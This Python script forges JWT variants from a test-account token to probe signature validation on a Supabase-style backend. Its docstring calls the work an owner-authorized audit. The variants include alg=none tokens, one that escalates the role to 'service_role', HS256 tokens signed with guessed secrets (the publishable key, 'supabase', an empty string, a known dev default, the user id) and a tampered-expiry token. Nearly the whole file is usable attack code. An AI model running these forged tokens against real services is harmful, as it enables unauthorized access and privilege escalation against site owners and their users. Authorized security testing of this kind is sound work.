#!/usr/bin/env python3
"""Forge candidate JWTs from the legitimate test-account token to test signature validation.

Owner-authorized audit (onlyfakeai.ru). Only uses our own test account's claims.
Writes variants to /tmp/forged/<name>.txt and prints a manifest.
"""
import base64
import hashlib
import hmac
import json
import os

KEY = "<publishable-key>"


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def enc(d: dict) -> str:
    b = json.dumps(d, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def hs256(secret: str, header: dict, payload: dict) -> str:
    h = enc(header)
    p = enc(payload)
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{h}.{p}.{sig}"


def main() -> None:
    tok = open("/tmp/token.txt").read().strip()
    h, p, _s = tok.split(".")
    orig_header = json.loads(b64d(h))
    payload = json.loads(b64d(p))
    print("original header :", orig_header)
    print(
        "original payload: sub=%s role=%s aud=%s exp=%s"
        % (payload.get("sub"), payload.get("role"), payload.get("aud"), payload.get("exp"))
    )
    os.makedirs("/tmp/forged", exist_ok=True)
    variants = {}

    # 1. alg=none, empty signature
    variants["alg_none"] = (
        enc({"alg": "none", "typ": "JWT"}) + "." + enc(payload) + "."
    )
    # 2. alg=none, no trailing dot
    variants["alg_none_nodot"] = enc({"alg": "none", "typ": "JWT"}) + "." + enc(payload)
    # 3. role escalation with alg=none (payload manipulated only, NOT a valid signature)
    esc = dict(payload)
    esc["role"] = "service_role"
    variants["alg_none_service_role"] = (
        enc({"alg": "none", "typ": "JWT"}) + "." + enc(esc) + "."
    )
    # 4. expired alg=none token (exp in the past)
    old = dict(payload)
    old["exp"] = 1000000000
    old["iat"] = 999999999
    variants["alg_none_expired"] = (
        enc({"alg": "none", "typ": "JWT"}) + "." + enc(old) + "."
    )
    # 5. HS256 with the publishable/anon key as HMAC secret (classic mistake)
    variants["hs256_pubkey"] = hs256(
        KEY, {"alg": "HS256", "typ": "JWT"}, payload
    )
    # 6. HS256 secret "supabase"
    variants["hs256_supabase"] = hs256(
        "supabase", {"alg": "HS256", "typ": "JWT"}, payload
    )
    # 7. HS256 empty secret
    variants["hs256_empty"] = hs256("", {"alg": "HS256", "typ": "JWT"}, payload)
    # 8. HS256 with common Supabase local dev secret
    variants["hs256_devsecret"] = hs256(
        "your-super-secret-jwt-token-with-at-least-32-characters",
        {"alg": "HS256", "typ": "JWT"},
        payload,
    )
    # 9. HS256 with user id as secret
    variants["hs256_userid"] = hs256(
        payload.get("sub", ""), {"alg": "HS256", "typ": "JWT"}, payload
    )
    # 10. Original valid token (control)
    variants["valid_control"] = tok
    # 11. Original token with tampered exp only (signature no longer valid)
    variants["tampered_exp"] = f"{h}.{enc(old)}.{_s}"

    for name, value in variants.items():
        path = f"/tmp/forged/{name}.txt"
        with open(path, "w") as fh:
            fh.write(value)
        print(f"{name:26s} len={len(value):5d} -> {path}")


if __name__ == "__main__":
    main()
